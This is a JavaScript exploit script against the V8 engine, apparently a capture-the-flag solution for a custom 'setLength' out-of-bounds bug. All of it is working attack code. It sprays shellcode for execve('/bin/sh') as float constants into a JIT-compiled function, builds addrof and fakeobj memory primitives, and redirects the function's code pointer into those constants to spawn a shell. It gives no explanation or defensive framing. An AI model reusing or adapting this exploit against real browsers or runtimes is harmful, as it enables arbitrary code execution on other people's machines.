var buf = new ArrayBuffer(8);
var f64 = new Float64Array(buf);
var i64 = new BigInt64Array(buf);

function f2i(v) {
        f64[0] = v;
        return i64[0];
}
function i2f(v) {
        i64[0] = v;
        return f64[0];
}
function hex(v) { return "0x"+(v & 0xffffffffffffffffn).toString(16); }


var x0 = i2f(0xcc0ceb53583b6a90n);
var x1 = i2f(0xcc0ceb905a5e5353n);
var x2 = i2f(0x110ceb9000686866n);
var x3 = i2f(0x110ceb90732f6866n);
var x4 = i2f(0x110ceb906e696866n);
var x5 = i2f(0x110ceb90622f6866n);
var x6 = i2f(0x112233cc050f5f54n);
var x7 = i2f(0x1122334455667708n);
var x8 = i2f(0x1122334455667780n);
var x9 = i2f(0x1122334455667088n);
var x10= i2f(0x1122334455607788n);

function jitme(i) {
	if ( i > 10) return i+x0+x1+x2+x3+x4+x5+x6+x7+x8+x9+x10;
	return i;
}
/*
   [ when compiled with turbo ]
   0x307a000454e7:      movabs r10,0xcc0ceb53583b6a90
   0x307a000454f1:      vmovq  xmm1,r10
   0x307a000454f6:      vaddsd xmm0,xmm1,xmm0
   0x307a000454fa:      movabs r10,0xcc0ceb905a5e5353
   0x307a00045504:      vmovq  xmm1,r10
   0x307a00045509:      vaddsd xmm0,xmm1,xmm0
   0x307a0004550d:      movabs r10,0x110ceb9000686866
   0x307a00045517:      vmovq  xmm1,r10
   0x307a0004551c:      vaddsd xmm0,xmm1,xmm0
   0x307a00045520:      movabs r10,0x110ceb90732f6866
   0x307a0004552a:      vmovq  xmm1,r10
   0x307a0004552f:      vaddsd xmm0,xmm1,xmm0
   0x307a00045533:      movabs r10,0x110ceb906e696866
   0x307a0004553d:      vmovq  xmm1,r10
   0x307a00045542:      vaddsd xmm0,xmm1,xmm0
   0x307a00045546:      movabs r10,0x110ceb90622f6866
   0x307a00045550:      vmovq  xmm1,r10
   0x307a00045555:      vaddsd xmm0,xmm1,xmm0
   0x307a00045559:      movabs r10,0x112233cc050f5f54
   0x307a00045563:      vmovq  xmm1,r10
   0x307a00045568:      vaddsd xmm0,xmm1,xmm0
   0x307a0004556c:      movabs r10,0x1122334455667708
   0x307a00045576:      vmovq  xmm1,r10
   0x307a0004557b:      vaddsd xmm0,xmm1,xmm0
   0x307a0004557f:      movabs r10,0x1122334455667780
   0x307a00045589:      vmovq  xmm1,r10
   0x307a0004558e:      vaddsd xmm0,xmm1,xmm0
   0x307a00045592:      movabs r10,0x1122334455667088
   0x307a0004559c:      vmovq  xmm1,r10
   0x307a000455a1:      vaddsd xmm0,xmm1,xmm0
   0x307a000455a5:      movabs r10,0x1122334455607788
   0x307a000455af:      vmovq  xmm1,r10

   [ while my code is in imm64. ]
   0x307a000454ea:      push   0x3b
   0x307a000454ec:      pop    rax
   0x307a000454ed:      push   rbx
   0x307a000454ee:      jmp    0x307a000454fc
   0x307a000454f0:      int3
   ...
   0x307a000454fc:      push   rbx
   0x307a000454fd:      push   rbx
   0x307a000454fe:      pop    rsi
   0x307a000454ff:      pop    rdx
   0x307a00045500:      nop
   0x307a00045501:      jmp    0x307a0004550f
   0x307a00045503:      int3
   ...

*/

for (let i = 0; i < 0x3000; i++) {
	jitme(i);
}

var bug = [1.1];
bug.setLength(-1);
var arr = [1.1, 2.2, 3.3];
var reader = [arr];
var fake_array = [1.2, 2.3];


function addrof(obj) {
	reader[0] = obj;
	//console.log(hex(f2i(bug[21])));
	return (f2i(bug[21]) & 0xffffffffn);
}

var double_array_map = f2i(bug[24]) >> 32n;
console.log("double_array_map:", hex(double_array_map));

function fakeobj(addr) {
	fake_array[0] = i2f((2n << 32n) + double_array_map);
	fake_array[1] = i2f((0x20n << 32n) + addr-0x8n);
	bug[21] = i2f(((addrof(fake_array) + 0x20n)));
	return reader[0];
}

var addr_jitme = addrof(jitme);
var x = fakeobj(addr_jitme+0x14n);

// wait for optimization (or code ptr points to baseline jitted code.( which is useless ))
for (let i = 0; i < 0x10000; i++) {
	jitme(i);
}

var addr_code = f2i(x[0]);
console.log("addr_code:", hex(addr_code>>32n));
x[0] += i2f(0x6an << 32n) // local
//x[0] += i2f(0x62n << 32n) // remote


/*
//var target = (addr_code>>32n)+0xaan; // local
var target = (addr_code>>32n)+0xa2n; // remote
console.log("target:", hex(target));
var y = fakeobj(target);
var opc = f2i(y[0]);
console.log("start_of_shellcode:", hex(opc));
*/

jitme(1337);

